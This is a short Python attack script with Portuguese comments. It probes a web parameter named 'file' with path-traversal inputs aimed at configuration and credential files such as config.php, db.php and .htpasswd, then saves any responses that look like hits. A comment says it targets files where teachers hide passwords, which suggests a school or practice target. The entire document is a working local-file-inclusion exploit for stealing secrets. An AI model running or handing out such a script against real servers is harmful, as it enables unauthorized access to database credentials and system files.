import requests

url = ""
# Lista de arquivos onde professores costumam esconder senhas
wordlist = [
    "../config.php",
    "../db.php",
    "../conexao.php",
    "../../config.php",
    "../settings.php",
    "../auth.php",
    "../../index.php",
    ".htpasswd",
    "../setup.php",
    "../install.php",
    "../../db_connect.php",
]

for arquivo in wordlist:
    print(f"[*] Testando: {arquivo}")
    res = requests.get(url, params={"file": arquivo})

    # Se o tamanho da resposta for diferente do erro padrão, achamos algo!
    if "Warning" not in res.text or len(res.text) > 1000:
        print(f"[!!!] POSSÍVEL SUCESSO: {arquivo}")
        with open(f"achado_{arquivo.replace('../', '')}.html", "w") as f:
            f.write(res.text)
